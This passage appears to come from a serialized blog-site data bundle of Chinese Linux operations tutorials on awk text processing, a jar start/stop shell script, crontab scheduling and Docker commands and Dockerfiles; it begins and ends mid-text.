awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print toupper($1)}\'\nAA\n[root@localhost awk]# echo "aa BB  cc dd  ee ff" | awk  \'{print tolower($2)}\'\nbb\n[root@localhost awk]# echo "aa BB  cc dd  ee ff" | awk  \'{print length($2)}\'\n2\n[root@localhost awk]# echo "asdfghj" | awk \'{print substr($1,2,3)}\'\nsdf\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 条件\n\nawk 允许指定输出条件，只输出符合条件的行。\nawk \' 条件 {动作}\' 文件名\n\n[root@localhost awk]# cat exp.txt \n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/chenfan\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'/stsvc/ {print $0}\'     包含 stsvc 的行\n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'/stsvc\\/fms/ {print $0}\' 包含 stsvc/fms 的行\n/stsvc/fms/conf/application.yml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n布尔值判断\n\n[root@localhost awk]# cat exp.txt | awk \'NR==2 {print $0}\'　　等于第二行\n/stsvc/sms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'NR>4 {print $0}\'　　大于第四行\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'NR%2==1 {print $0}\'　　奇数行\n/stsvc/fms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/jhhuang\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n某个字段等于具体值\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \' $2=="ff" {print $0}\'\ndd ff\n\n\n1\n2\n3\n4\n5\n6\n\n\nif 语句\n\n[root@localhost awk]# echo "aa ss dd" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\naa ss dd\n[root@localhost awk]# echo "aa ss dds" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\nnothing\n\n\n1\n2\n3\n4\n\n\n\n# demo\n\n以下脚本复制粘贴就可用，需要在和应用同级目录新建一个 logs 文件夹，使用方法 ./ 脚本.sh start 应用名称.jar，其中使用了 awk 命令解决获取 pid 问题\n\n#/bin/bash\n\n# 这里说一下 我用 /bin/sh 脚本里打印非正常 换成 /bin/bash 就好了\n# 通过执行文件获得 要被执行的jar 例如 ./start.sh test-0.0.1.jar 获取到 test-0.0.1.jar\n# $@获得所有参数,$1获得第一个参数\nMATHOD=$1\nAPP_NAME=$2\n# 在方法内直接使用是无法获取到个数的\nPARAM=$#\n\n# 参数校验\ncheck(){\n    if [ $PARAM -ne 2 ]; then\n        echo "run method  $0 start | stop  app_name.jar"\n        exit\n    fi\n}\n\n\n# 判断程序是否运行 如果不存在返回1，存在返回0\nis_exist(){\n    check\n    # grep -v grep 就是查找不含有 grep 字段的行，默认第一条命令会查出两行数据，第一行一般是我们所需要的，第二行就属于 grep的数据\n    # grep 是查找含有指定文本行的意思，比如grep test 就是查找含有test的文本的行\n    # grep -v 是反向查找的意思，比如 grep -v grep 就是查找不含有 grep 字段的行\n    # $(ps -ef | grep $jarname | grep -v grep) 是执行一个命令，并把结果赋给pid\n    # awk 百度\n    pid=`ps -ef | grep $APP_NAME | grep -v grep | awk \'{print $2}\'`\n    # [ -z STRING ] “STRING” 的长度为零则为真。\n    if [ -z "$pid" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#启动方法\nstart(){\n    is_exist\n    # %%-* 表示从右边开始，删除最后（最左边）的 - 号及右边的多有字符\n    LOG_NAME="${APP_NAME%%-*}.log"\n    # $? 是一个特殊变量，用来获取上一个命令的退出状态，或者上一个函数的返回值。\n    # -eq 等于\n    if [ $? -eq 0 ]; then\n        stop\n        start_app\n    else\n        start_app\n    fi\n}\n\nstart_app(){\n    echo "$APP_NAME start..."\n    # 2> 表示把标准错误(stderr)重定向，标准输出(stdout)是1 2> 后面可以跟文件名，或者是&1, &2，分别表示重定向到标准输出和标准错误。\n    nohup java -jar $APP_NAME > logs/$LOG_NAME 2>&1 &\n    # 延迟 1s 1秒 1m 1分钟 1h 1小时 1d 1天\n    sleep 1s;\n    tail -f logs/$LOG_NAME\n}\n\n\n\n# 停止运行\nstop(){\n    is_exist\n    if [ $? -eq 0 ]; then\n        echo "$APP_NAME is running "\n        kill -9 $pid\n        echo "$APP_NAME is kill ok. pid is $pid"\n    else\n        echo "${APP_NAME} is not running"\n    fi\n}\n\n# 判断参数1是否为空，为空则告诉标准写法，不为空则把参数当方法执行\nif [ ! $1 ]; then\n    echo "run method  $0 start | stop  app_name.jar"\n    exit\nelse\n    $1\nfi\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n\n\n> 编写 shell 脚本，函数一定要在最上面，否则调用函数会报 command not found',normalizedContent:'awk 命令是逐行扫描文件（从第 1 行到最后一行），寻找含有目标文本的行，如果匹配成功，则会在该行上执行用户想要的操作；反之，则不对行做任何处理。\n\n\n# f（指定字段分隔符）\n\n默认使用空格作为分隔符。\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print $1}\'\naa\n[root@localhost awk]# echo "aa bb l cc dd l ee ff" | awk -f \'l\' \'{print $1}\'\naa bb \n[root@localhost awk]# echo "aa bb  cc : dd  ee ff" | awk -f \':\' \'{print $1}\'\naa bb  cc \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# fs（字段分隔符）\n\n默认是空格和制表符。\n$0 表示当前整行内容，$1，$2 表示第一个字段，第二个字段\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $0}\'\naa bb cc  dd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $1}\'\naa\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $2}\'\nbb\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# nf（当前行的字段个数）\n\n就代表最后一个字段，(nf-1) 代表倒数第二个字段\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $nf}\'\ndd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $(nf-1)}\'\ncc\n\n\n1\n2\n3\n4\n\n\n\n# nr (当前处理的是第几行)\n\n打印当前行号和当前文本内容\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \'{print nr")", $0}\'\n1) aa ss\n2) dd ff\n3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n逗号表示输出的变量之间用空格分隔；\n右括号必需使用 双引号 才可以原样输出\n打印指定行内容：\n\n[root@localhost s17]# java -version \njava version "1.8.0_131"\njava(tm) se runtime environment (build 1.8.0_131-b11)\njava hotspot(tm) 64-bit server vm (build 25.131-b11, mixed mode)\n[root@localhost s17]# java -version 2>&1  | awk \'nr==1 {print $0}\'\njava version "1.8.0_131"\n[root@localhost s17]# \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# filename (当前文件名)\n\n[root@localhost awk]#  awk \'{print filename, nr")", $0}\' test.txt \ntest.txt 1) aa ss\ntest.txt 2) dd ff\ntest.txt 3) gg hh\n[root@localhost awk]# cat test.txt | awk \'{print filename, nr")", $0}\'\n- 1) aa ss\n- 2) dd ff\n- 3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nawk \'{condition action}\' filename 这种形式时可以打印文件名；\n通过 |（管道符）读取内容时打印的是 -\n\n\n# 其他变量\n\nrs：行分隔符，用于分割每一行，默认是换行符。\nofs：输出字段的分隔符，用于打印时分隔字段，默认为空格。\nors：输出记录的分隔符，用于打印时分隔记录，默认为换行符。\nofmt：数字输出的格式，默认为％.6g。\n\n\n# print 和 printf\n\nawk 中同时提供了 print 和 printf 两种打印输出的函数。\n\nprint 函数，参数可以是变量、数值或者字符串。字符串必须用双引号引用，参数用逗号分隔。如果没有逗号，参数就串联在一起而无法区分。这里，逗号的作用与输出文件的分隔符的作用是一样的，只是后者是空格而已。\n\nprintf 函数，其用法和 c 语言中 printf 基本相似，可以格式化字符串，输出复杂时，printf 更加好用，代码更易懂。\n\n\n# 其他函数\n\ntoupper ()：字符转为大写。\ntolower ()：字符转为小写。\nlength ()：返回字符串长度。\nsubstr ()：返回子字符串。\nsubstr ($1,2)：返回第一个字段，从第 2 个字符开始一直到结束。\nsubstr ($1,2,3)：返回第一个字段，从第 2 个字符开始开始后的 3 个字符。\nsin ()：正弦。\ncos ()：余弦。\nsqrt ()：平方根。\nrand ()：随机数。\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print toupper($1)}\'\naa\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print tolower($2)}\'\nbb\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print length($2)}\'\n2\n[root@localhost awk]# echo "asdfghj" | awk \'{print substr($1,2,3)}\'\nsdf\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 条件\n\nawk 允许指定输出条件，只输出符合条件的行。\nawk \' 条件 {动作}\' 文件名\n\n[root@localhost awk]# cat exp.txt \n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/chenfan\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'/stsvc/ {print $0}\'     包含 stsvc 的行\n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'/stsvc\\/fms/ {print $0}\' 包含 stsvc/fms 的行\n/stsvc/fms/conf/application.yml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n布尔值判断\n\n[root@localhost awk]# cat exp.txt | awk \'nr==2 {print $0}\'　　等于第二行\n/stsvc/sms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'nr>4 {print $0}\'　　大于第四行\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'nr%2==1 {print $0}\'　　奇数行\n/stsvc/fms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/jhhuang\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n某个字段等于具体值\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \' $2=="ff" {print $0}\'\ndd ff\n\n\n1\n2\n3\n4\n5\n6\n\n\nif 语句\n\n[root@localhost awk]# echo "aa ss dd" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\naa ss dd\n[root@localhost awk]# echo "aa ss dds" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\nnothing\n\n\n1\n2\n3\n4\n\n\n\n# demo\n\n以下脚本复制粘贴就可用，需要在和应用同级目录新建一个 logs 文件夹，使用方法 ./ 脚本.sh start 应用名称.jar，其中使用了 awk 命令解决获取 pid 问题\n\n#/bin/bash\n\n# 这里说一下 我用 /bin/sh 脚本里打印非正常 换成 /bin/bash 就好了\n# 通过执行文件获得 要被执行的jar 例如 ./start.sh test-0.0.1.jar 获取到 test-0.0.1.jar\n# $@获得所有参数,$1获得第一个参数\nmathod=$1\napp_name=$2\n# 在方法内直接使用是无法获取到个数的\nparam=$#\n\n# 参数校验\ncheck(){\n    if [ $param -ne 2 ]; then\n        echo "run method  $0 start | stop  app_name.jar"\n        exit\n    fi\n}\n\n\n# 判断程序是否运行 如果不存在返回1，存在返回0\nis_exist(){\n    check\n    # grep -v grep 就是查找不含有 grep 字段的行，默认第一条命令会查出两行数据，第一行一般是我们所需要的，第二行就属于 grep的数据\n    # grep 是查找含有指定文本行的意思，比如grep test 就是查找含有test的文本的行\n    # grep -v 是反向查找的意思，比如 grep -v grep 就是查找不含有 grep 字段的行\n    # $(ps -ef | grep $jarname | grep -v grep) 是执行一个命令，并把结果赋给pid\n    # awk 百度\n    pid=`ps -ef | grep $app_name | grep -v grep | awk \'{print $2}\'`\n    # [ -z string ] “string” 的长度为零则为真。\n    if [ -z "$pid" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#启动方法\nstart(){\n    is_exist\n    # %%-* 表示从右边开始，删除最后（最左边）的 - 号及右边的多有字符\n    log_name="${app_name%%-*}.log"\n    # $? 是一个特殊变量，用来获取上一个命令的退出状态，或者上一个函数的返回值。\n    # -eq 等于\n    if [ $? -eq 0 ]; then\n        stop\n        start_app\n    else\n        start_app\n    fi\n}\n\nstart_app(){\n    echo "$app_name start..."\n    # 2> 表示把标准错误(stderr)重定向，标准输出(stdout)是1 2> 后面可以跟文件名，或者是&1, &2，分别表示重定向到标准输出和标准错误。\n    nohup java -jar $app_name > logs/$log_name 2>&1 &\n    # 延迟 1s 1秒 1m 1分钟 1h 1小时 1d 1天\n    sleep 1s;\n    tail -f logs/$log_name\n}\n\n\n\n# 停止运行\nstop(){\n    is_exist\n    if [ $? -eq 0 ]; then\n        echo "$app_name is running "\n        kill -9 $pid\n        echo "$app_name is kill ok. pid is $pid"\n    else\n        echo "${app_name} is not running"\n    fi\n}\n\n# 判断参数1是否为空，为空则告诉标准写法，不为空则把参数当方法执行\nif [ ! $1 ]; then\n    echo "run method  $0 start | stop  app_name.jar"\n    exit\nelse\n    $1\nfi\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n\n\n> 编写 shell 脚本，函数一定要在最上面，否则调用函数会报 command not found',charsets:{cjk:!0}},{title:"Linux 定时任务",frontmatter:{title:"Linux 定时任务",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2303",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2303.Linux%20%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1.html",relativePath:"04.运维/2300.linux/2303.Linux 定时任务.md",key:"v-827e00c2",path:"/linux/2303/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:"crontab 命令 被用来提交和管理用户的需要周期性执行的任务，与 windows 下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动 crond 进程，crond 进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。\n\ncrontab -e : 修改 crontab 文件. 如果文件不存在会自动创建。 \ncrontab -l : 显示 crontab 文件。 \ncrontab -r : 删除 crontab 文件。\ncrontab -ir : 删除 crontab 文件前提醒用户。\n\n\n1\n2\n3\n4\n\n\n{minute} {hour} {day-of-month} {month} {day-of-week} {full-path-to-shell-script} \no minute: 区间为 0 – 59 \no hour: 区间为0 – 23 \no day-of-month: 区间为0 – 31 \no month: 区间为1 – 12. 1 是1月. 12是12月. \no Day-of-week: 区间为0 – 7. 周日可以是0或7.\n\n1、在 凌晨00:01运行\n1 0 * * * /home/linrui/XXXX.sh\n2、每个工作日23:59都进行备份作业。\n59 11 * * 1-5 /home/linrui/XXXX.sh\n3、每分钟运行一次命令\n*/1 * * * * /home/linrui/XXXX.sh\n4、每个月的1号 14:10 运行\n10 14 1 * * /home/linrui/XXXX.sh\n\n星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。\n 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”\n中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”\n正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n也可以进入 vim /etc/crontab (Linux 系统中用于配置 cron 任务的文件) 直接操作文件",normalizedContent:"crontab 命令 被用来提交和管理用户的需要周期性执行的任务，与 windows 下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动 crond 进程，crond 进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。\n\ncrontab -e : 修改 crontab 文件. 如果文件不存在会自动创建。 \ncrontab -l : 显示 crontab 文件。 \ncrontab -r : 删除 crontab 文件。\ncrontab -ir : 删除 crontab 文件前提醒用户。\n\n\n1\n2\n3\n4\n\n\n{minute} {hour} {day-of-month} {month} {day-of-week} {full-path-to-shell-script} \no minute: 区间为 0 – 59 \no hour: 区间为0 – 23 \no day-of-month: 区间为0 – 31 \no month: 区间为1 – 12. 1 是1月. 12是12月. \no day-of-week: 区间为0 – 7. 周日可以是0或7.\n\n1、在 凌晨00:01运行\n1 0 * * * /home/linrui/xxxx.sh\n2、每个工作日23:59都进行备份作业。\n59 11 * * 1-5 /home/linrui/xxxx.sh\n3、每分钟运行一次命令\n*/1 * * * * /home/linrui/xxxx.sh\n4、每个月的1号 14:10 运行\n10 14 1 * * /home/linrui/xxxx.sh\n\n星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。\n 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”\n中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”\n正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n也可以进入 vim /etc/crontab (linux 系统中用于配置 cron 任务的文件) 直接操作文件",charsets:{cjk:!0}},{title:"Docker 概念、命令及Dockerfile介绍",frontmatter:{title:"Docker 概念、命令及Dockerfile介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/400",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/40.Docker/400.Docker%20%E6%A6%82%E5%BF%B5%E3%80%81%E5%91%BD%E4%BB%A4%E5%8F%8ADockerfile%E4%BB%8B%E7%BB%8D.html",relativePath:"04.运维/40.Docker/400.Docker 概念、命令及Dockerfile介绍.md",key:"v-775a7bcf",path:"/docker/400/",headers:[{level:2,title:"1.docker的感念，docker是什么",slug:"_1-docker的感念-docker是什么",normalizedTitle:"1.docker 的感念，docker 是什么",charIndex:2},{level:2,title:"2.docker基础命令",slug:"_2-docker基础命令",normalizedTitle:"2.docker 基础命令",charIndex:228},{level:2,title:"3.修改已经存在容器的端口",slug:"_3-修改已经存在容器的端口",normalizedTitle:"3. 修改已经存在容器的端口",charIndex:1900},{level:2,title:"4.制作镜像的基本命令",slug:"_4-制作镜像的基本命令",normalizedTitle:"4. 制作镜像的基本命令",charIndex:2414},{level:3,title:"概念",slug:"概念",normalizedTitle:"概念",charIndex:2431},{level:3,title:"命令",slug:"命令",normalizedTitle:"命令",charIndex:239},{level:3,title:"配置Idea连接Docker",slug:"配置idea连接docker",normalizedTitle:"配置 idea 连接 docker",charIndex:4504},{level:3,title:"实战构建SpringBoot应用",slug:"实战构建springboot应用",normalizedTitle:"实战构建 springboot 应用",charIndex:4716},{level:2,title:"5. Docker 使用阿里云仓库或自建仓库",slug:"_5-docker-使用阿里云仓库或自建仓库",normalizedTitle:"5. docker 使用阿里云仓库或自建仓库",charIndex:5697},{level:3,title:"阿里云仓库",slug:"阿里云仓库",normalizedTitle:"阿里云仓库",charIndex:5709},{level:3,title:"自建仓库",slug:"自建仓库",normalizedTitle:"自建仓库",charIndex:5715},{level:2,title:"6. 上传DockerHub",slug:"_6-上传dockerhub",normalizedTitle:"6. 上传 dockerhub",charIndex:6101}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"1.docker的感念，docker是什么 2.docker基础命令 3.修改已经存在容器的端口 4.制作镜像的基本命令 概念 命令 配置Idea连接Docker 实战构建SpringBoot应用 5. Docker 使用阿里云仓库或自建仓库 阿里云仓库 自建仓库 6. 上传DockerHub",content:'# 1.docker 的感念，docker 是什么\n\ndocker 分为三种感念：镜像 容器 仓库\n镜像：类似于一个模板，里面包含了一些内容\n容器：容器是一个镜像的实例，如果理解镜像为一个 class，那么容器就被理解为是 new class (); 是镜像的实例\n仓库：就是下载镜像资源的地方。\ndocker 容器不是虚拟机，容器可以说是一个进程，我们可以给容器分配内存。就像 windows 安装了虚拟机，可以给虚拟机分配内存大小，磁盘空间。\n\n\n# 2.docker 基础命令\n\n搜索镜像，从 maven 仓库中查询\n\ndocker search mysql\n\n\n1\n\n\n列出当前系统存在的镜像\n\ndocker images\n\n\n1\n\n\n给镜像更换名称\n\ndocker tag imageId repository:tag\n\n\n1\n\n\n删除镜像 (-f 强制) 必须知道镜像的 imageId\n\ndocker rmi -f imageId\n\n\n1\n\n\nrepository:tag (镜像的仓库源：镜像的标签) 拉取\n\ndocker pull repository:tag\n\n\n1\n\n\n运行一个容器\n\ndocker run -it  -d --name "xxx" -p port1:port2 -p port3:port4 -v home/data:/data repository:tag \n\n\n1\n\n * run：运行容器命令\n * -it：运行后直接与终端交互，比如运行 jar 或其他应用的时候 查看他们的启动信息\n * -d：后台运行\n * -p port1:port2：端口映射 port1 (宿主机) port2 (容器) 容器的端口是可以重复的，所以容器和物理机的端口可以一致。rabbitmq 有两个端口 5672 和 15672 所以会用到双 -p repository:tag -> 如果不指定 tag，默认使用最新的\n * --name "xxx"：指定容器名称\n * -v /home/data:/data：/home/data (宿主机):/data (容器) 本地地址和容器地址产生挂载关系， 在容器内部该目录下，或者宿主机内部该目录下，修改文件、创建文件，彼此都会同步修改\n * --restart=always：总是运行，当重启 docker 后会自动运行起来\n * repository:tag：指定运行镜像的名称\n\n查看运行的容器\n\ndocker ps \n\n\n1\n\n\n查看所有状态的容器\n\ndocker ps -a\n\n\n1\n\n\n检查容器内部信息\n\ndocker inspect 容器名称|容器前12位id\n\n\n1\n\n\n停止容器\n\ndocker stop 容器名称|容器前12位id\n\n\n1\n\n\n开启容器运行\n\ndocker start 容器名称\n\n\n1\n\n\n删除容器之前必须先停止容器运行\n\ndocker rm 容器名称\n\n\n1\n\n\n查看容器日志\n\ndokcer logs -f 容器id\n\n\n1\n\n\n进入容器内部\n\ndocker exec -it mysql bash#  进入mysql内部\nmysql -uroot -p123456#  登录mysql服务 注意这里mysql -uroot -p123456 是连起来的\n\n\n1\n2\n\n\n把一个容器制作为一个新的镜像\n\ndocker commit \n -m="提交信息" \n -a="作者" \n 容器id\n 自定义镜像名称:[自定义标签名]\n\n\n1\n2\n3\n4\n5\n\n\n查看容器的信息\n\ndocker inspect 容器ID\n\n\n1\n\n\n对于没有私有仓库的要使服务器间共享一个 docker 镜像，可以先把某台机器上的进行先导出，然后其他服务器在导入即可\n\n# 导出\ndocker save \n 镜像ID\n -o /本地路径/文件.tar  这句话意思导出到你宿主机的一个地址，文件名随便起后缀为tar，路径要提前建好\n\n# 导入\ndocker load < /上传文件的地址/导出的文件名.tar\n\n# 查看导入的镜像\ndocker images\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n容器之间共享，容器 2 共用 容器 1\n\ndocker tun -it \n  -- name 容器2\n  --volumes-from 容器1(容器1必须已启动)\n  镜像名称\n\n\n1\n2\n3\n4\n\n\n查看制作镜像时叠加其他镜像的操作\n\ndocker history 镜像ID\n\n\n1\n\n\n\n# 3. 修改已经存在容器的端口\n\n1、停止容器 (docker stop d00254ce3af7)\n2、停止 docker 服务 (systemctl stop docker)\n3、修改这个容器的 hostconfig.json 文件中的端口（原帖有人提到，如果 config.v2.json 里面也记录了端口，也要修改）\n\ncd /var/lib/docker/containers/d00254ce3af7*    # 这里是CONTAINER ID\n\nvim hostconfig.json\n如果之前没有端口映射, 应该有这样的一段:\n"PortBindings":{}\n\n增加一个映射, 这样写:\n"PortBindings":{"8080/tcp":[{"HostIp":"","HostPort":"60000"}]}\n前一个数字是容器端口, 后一个是宿主机端口。将宿主机的60000端口映射到容器的8080端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n4、启动 docker 服务 (systemctl start docker)\n5、启动容器 (docker start d00254ce3af7)\n\n\n# 4. 制作镜像的基本命令\n\n\n# 概念\n\n\n\nDockerfile 默认会把当前所在文件的上下问都发送给 Docker Server，最终制作成一个镜像，比如你得 DockerFile 在 linux 的根 (/) 目录，那么就会递归根目录下的所有文件，发送到 Docker Server 制作镜像，所以制作 Dockerfile 最好是在某一个地方新建文件夹去制作。制作过程都是依赖于一个个的镜像，所以会有缓存加速下次制作，如果不需要依赖缓存 可以在命令制作的最后面加 --no-cache\n\n.dockerIgnore 是用来忽略哪些文件或目录不参与到制作镜像中\n\n制作命令： docker build -f /home/docker/nginx/Dockerfile . -f 用来指定 Dockerfile 所在的位置，一般会使用 docker build -t nginx2 . -t 在当前目录制作镜像， nginx2 镜像的名字， . 代表 Dockerfile 就在当前目录\n\n\n# 命令\n\n指令            描述\nFROM          构建的新镜像是基于哪个镜像。例如：FROM centos:6，第一个指令必须是 FROM\nMAINTAINER    镜像维护者姓名或邮箱地址。例如：MAINTAINER Mr.chen\nRUN           构建镜像时运行的 Shell 命令。例如：RUN ["yum","install","httpd"] 也可以直接 RUN\n              yum install httpd 或者 RUN yum install httpd\nCMD           容器运行时执行的Shell命令 （编写的 dockerfile 中多个 cmd 都会执行，但默认保留最后一个命令，如果\n              docker run 运行时传递 command，会覆盖 cmd 的保留命令），启动容器会执行 CMD\n              的保留命令。例如：CMD ["-c","/start.sh"] 也可以是 CMD echo \'hello docker\'\nEXPOSE        声明容器运行的服务端口。例如：EXPOSE 80 443，但是默认都是 tcp 协议，如果想要暴漏 udp 协议，则是\n              EXPOSE 80/udp ，注意只能是 tcp 或 udp\nENV           设置容器内的环境变量。例如：ENV MYSQL_ROOT_PASSWORD 123456\nADD           将宿主机目录下的文件拷贝进镜像且 ADD 命令会自动处理 URL 和解压 tar 包 例如：ADD\n              ["src","dest"] 或者 ADD https://xxx.com/html.tar.gz\n              /var/www/html 或者：ADD html.tar.gz/var/www/html\nCOPY          拷贝文件或目录到镜像（不能自动解压缩）。例如：COPY ./start.sh/start.sh\nENTRYPOINT    运行容器时执行的 Shell 命令（不能被运行时传递的参数覆盖)，比 CMD 牛皮一些。例如：ENTRYPOINT\n              ["/bin/bash","-c","/start.sh"] 或者 ENTRYPOINT /bin/bash -c\n              "/start.sh"\nVOLUME        指定容器挂载点到宿主机自动生成的目录或其他容器 例如：VOLUME ["/var/lib/mysql"]\nUSER          为 RUN，CMD 和 ENTRYPOINT 执行命令指定运行用户 例如：USER Mr_chen\nWORKDIR       指定在创建容器后，终端默认登录进来的工作目录，一个落脚点 例如：WORKDIR /data， 该命令也会影响\n              ENTRYPOINT 运行例如jar包时的位置，默认会自带WORKDIR的路径\nHEALTHCHECK   健康检查。例如：HEALTHCHECK --interval=5m --timeout=3s --retries=3\n              CMD curl -f http://localhost/ exit 1\nARG           在构建镜像时指定一些参数。例如：ARG user\nONBUILD       当镜像被继承后触发在 ONBUILD 里写的命令，继承者直接使用 FROM 命令继承当前镜像的名称即可，在 build\n              的时候触发\n\n提示\n\n从 docker17.05 版本开始，dockerfile 中允许使用多个 FROM 指令\n\n\n# 配置 Idea 连接 Docker\n\n配置后方便我们把写好的 Docker File 直接打成镜像到 Docker 中，方便运行和管理\n\nvim /usr/lib/systemd/system/docker.service\n\n\n1\n\n\n\n\nsystemctl daemon-reload // 1，加载docker守护线程\nsystemctl restart docker // 2，重启docker\n\n\n1\n2\n\n\n\n# 实战构建 SpringBoot 应用\n\n在应用的根目录中创建 Dockerfile，具体构建之前一定要了解 SpringBoot 配置文件的加载路径优先级，这里牵扯到我们在修改配置文件时，可以指定挂载外部文件修改后同步到容器，否则，每改一次都要重新制作镜像\n\n提示\n\nSpringBoot 配置文件的加载路径优先级：\n工程根目录:./config/\n工程根目录：./\nclasspath:/config/\nclasspath:/\n\n# 基础镜像\nFROM openjdk:8-jre-slim\n# 作者\nMAINTAINER biguncle\n# 配置\nENV PARAMS=""\nEXPOSE 8081\n# 时区\nENV TZ=Asia/Shanghai\nRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone\n# 添加应用\nADD ./target/tool-boot-0.0.1-SNAPSHOT.jar /server/tool-boot.jar\n# 创建一个工作目录，并将外部配置文件复制到镜像中\nRUN mkdir /server/config\nCOPY /src/main/resources/application.yml /app/config/\nWORKDIR /server\n## 在镜像运行为容器后执行的命令\nENTRYPOINT java -jar -Dpolyglot.engine.WarnInterpreterOnly=false tool-boot.jar  $PARAMS\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n执行命令\n\n#build 构建应用的镜像\ndocker build -f 